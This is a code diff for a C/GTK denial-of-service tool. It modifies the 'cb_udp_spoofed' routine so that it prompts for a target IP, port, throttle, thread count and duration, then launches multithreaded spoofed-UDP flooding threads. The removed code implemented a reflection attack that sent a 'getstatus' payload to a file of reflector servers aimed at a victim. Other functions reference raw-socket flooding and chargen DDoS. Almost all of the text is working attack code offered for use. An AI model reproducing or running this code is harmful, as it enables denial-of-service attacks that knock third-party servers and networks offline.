@@ -531,7 +531,7 @@ void *flood_power(void *par1)
     struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
     struct sockaddr_in sin = td->sin;
 
-    //char new_ip[sizeof "255.255.255.255"];
+    char new_ip[sizeof "255.255.255.255"];
 
     int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
     if(s < 0)
@@ -1230,7 +1230,6 @@ void cb_chargen_ddos(void)
                 memset(new_node, 0x00, sizeof(struct list));
 
                 new_node->data.sin_addr.s_addr = inet_addr(buffer);
-                //new_node->prev = head;
                 new_node->next = head->next;
                 new_node->prev = head;
                 head->next = new_node;
@@ -1711,14 +1710,13 @@ void ParseResolverLine(char *strLine, int iLine)
     }
 }
 
-
 void cb_udp_spoofed(void)
 {
     GtkWidget *IP_dialog = NULL;
     GtkWidget *port_dialog = NULL;
-    GtkWidget *ip_file_dialog = NULL;
+    GtkWidget *throttle_dialog = NULL;
+    GtkWidget *thread_dialog = NULL;
     GtkWidget *time_dialog = NULL;
-    GtkWidget *message_dialog = NULL;
 
     GtkWidget *get_arg_entry_1 = NULL;
     GtkWidget *get_arg_entry_2 = NULL;
@@ -1728,9 +1726,10 @@ void cb_udp_spoofed(void)
 
     const gchar *IP = NULL;
     const gchar *port_number_spoof = NULL;
-    const gchar *ip_file = NULL;
+    const gchar *throttle_number = NULL;
+    const gchar *thread_number = NULL;
     const gchar *time_duration = NULL;
-    const gchar *message = NULL;
+
 
     GtkTextBuffer *text_buffer = NULL;
     gchar *text = NULL;
@@ -1758,15 +1757,19 @@ void cb_udp_spoofed(void)
 
     IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
-    ip_file_dialog = gtk_dialog_new_with_buttons("Enter IP File Name", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+
+    throttle_dialog = gtk_dialog_new_with_buttons("Enter Throttle", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+
+    thread_dialog = gtk_dialog_new_with_buttons("Enter Threads Number", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+
     time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
-    message_dialog = gtk_dialog_new_with_buttons("Enter Your Message", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+
 
     gtk_widget_set_size_request(IP_dialog, 360, 100);
     gtk_widget_set_size_request(port_dialog, 360, 100);
-    gtk_widget_set_size_request(ip_file_dialog, 360, 100);
+    gtk_widget_set_size_request(throttle_dialog, 360, 100);
+    gtk_widget_set_size_request(thread_dialog, 360, 100);
     gtk_widget_set_size_request(time_dialog, 360, 100);
-    gtk_widget_set_size_request(message_dialog, 360, 100);
 
     get_arg_entry_1 = gtk_entry_new();
     get_arg_entry_2 = gtk_entry_new();
@@ -1776,9 +1779,9 @@ void cb_udp_spoofed(void)
 
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(port_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
-    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(ip_file_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
-    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
-    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(message_dialog)->vbox), get_arg_entry_5, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(throttle_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(thread_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_5, TRUE, FALSE, 0);
 
 
     gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
@@ -1807,16 +1810,29 @@ void cb_udp_spoofed(void)
             break;
     }
 
-    gtk_widget_show_all(GTK_DIALOG(ip_file_dialog)->vbox);
-    switch(gtk_dialog_run(GTK_DIALOG(ip_file_dialog)))
+    gtk_widget_show_all(GTK_DIALOG(throttle_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(throttle_dialog)))
     {
         case GTK_RESPONSE_APPLY:
-            ip_file = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_3));
-            gtk_widget_hide(ip_file_dialog);
+            throttle_number = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_3));
+            gtk_widget_hide(throttle_dialog);
             break;
 
         default:
-            gtk_widget_hide(ip_file_dialog);
+            gtk_widget_hide(throttle_dialog);
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(thread_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(thread_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            thread_number = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
+            gtk_widget_hide(thread_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(thread_dialog);
             break;
     }
 
@@ -1824,80 +1840,46 @@ void cb_udp_spoofed(void)
     switch(gtk_dialog_run(GTK_DIALOG(time_dialog)))
     {
         case GTK_RESPONSE_APPLY:
-            time_duration = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
+            time_duration = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_5));
             gtk_widget_hide(time_dialog);
-            break;
-
-        default:
-            gtk_widget_hide(time_dialog);
-            break;
-    }
-
-    gtk_widget_show_all(GTK_DIALOG(message_dialog)->vbox);
-    switch(gtk_dialog_run(GTK_DIALOG(message_dialog)))
-    {
-        case GTK_RESPONSE_APPLY:
-            message = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_5));
-            gtk_widget_hide(message_dialog);
             break;
 
         default:
             gtk_widget_destroy(IP_dialog);
             gtk_widget_destroy(port_dialog);
+            gtk_widget_destroy(thread_dialog);
+            gtk_widget_destroy(throttle_dialog);
             gtk_widget_destroy(time_dialog);
-            gtk_widget_destroy(message_dialog);
             return;
     }
 
-    struct file_list *list = NULL;
-	int list_size = 0;
+    int num_threads = atoi(thread_number);
+    unsigned int floodport = atoi(port_number_spoof);
 
-	struct pthread_param param;
-	pthread_t udp_attack;
+    pthread_t thread[num_threads];
 
-	srand(time(0));
+    struct sockaddr_in sin;
 
-	FILE *pFile = fopen(ip_file, "r");
-	if (pFile == NULL)
-	{
-		printf("[X] Cannot open file\n");
-		return;
-	}
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(floodport);
+    sin.sin_addr.s_addr = inet_addr(IP);
 
-	while (!feof(pFile))
-	{
-		char *line;
-		line = getLine(pFile);
+    struct thread_data_spoofed td[num_threads];
 
-		char ip[1024];
-		int port;
+    int i;
+    for(i = 0; i < num_threads; i++)
+    {
+        td[i].thread_id = i;
+        td[i].sin = sin;
+        td[i].floodport = floodport;
+        td[i].throttle = atoi(throttle_number);
+        pthread_create( &thread[i], NULL, &flood_udp_spoofed, (void *) &td[i]);
+    }
 
-		if (sscanf(line, "%99[^:]:%99d", ip, &port) == 2)
-		{
-			list_size++;
-			list = (struct file_list *) realloc(list, sizeof(struct file_list) * list_size);
-			list[list_size - 1].ip = inet_addr(ip);
-			list[list_size - 1].port = port;
-        }
-
-		free(line);
-	}
-
-	fclose(pFile);
-
-	param.victim_ip = inet_addr(IP);
-	param.victim_port = atoi(port_number_spoof);
-
-	param.list = list;
-	param.list_size = list_size;
-
-	param.message = "\xFF\xFF\xFF\xFF\x67\x65\x74\x73\x74\x61\x74\x75\x73\x10";
-
-	pthread_create(&udp_attack, NULL, thread_attack, (void*) &param);
+    fprintf(stdout, "Starting Flood...\n");
 
 	wait_time_end(atoi(time_duration));
 
-    pthread_cancel(udp_attack);
 
     gtk_text_buffer_set_text(text_buffer, "Flooding is over ...\n", -1);
     g_print("%s", text);
